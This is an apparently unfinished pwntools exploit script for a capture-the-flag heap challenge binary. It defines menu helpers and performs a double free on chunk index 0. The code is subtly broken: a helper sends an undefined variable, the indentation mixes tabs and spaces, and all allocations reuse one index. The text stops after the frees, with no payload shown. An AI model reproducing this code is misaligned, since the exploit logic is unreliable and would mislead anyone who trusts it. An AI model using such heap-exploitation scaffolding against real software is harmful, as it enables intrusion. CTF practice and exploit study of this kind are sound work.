from pwn import *

sh = process('./4-ReeHY-main')
#sh =remote('')

def create(idx,size,con):
	sh.sendlineafter('$ ','1')
	sh.sendlineafter('size\n',str(size))
	sh.sendlineafter('cun\n',str(idx))
	sh.sendlineafter('content\n',content)

def delete(idx):
	sh.sendlineafter('$ ','2')
        sh.sendlineafter('dele\n',str(idx))

def edit(idx,con):
        sh.sendlineafter('$ ','3')
        sh.sendlineafter('edit\n',str(idx))
        sh.sendlineafter('content\n',con)

create(0,0x20,'a')
create(0,0x20,'b')
create(0,0x20,'a')
create(0,0x20,'c')

delete(0)
delete(1)
delete(0)
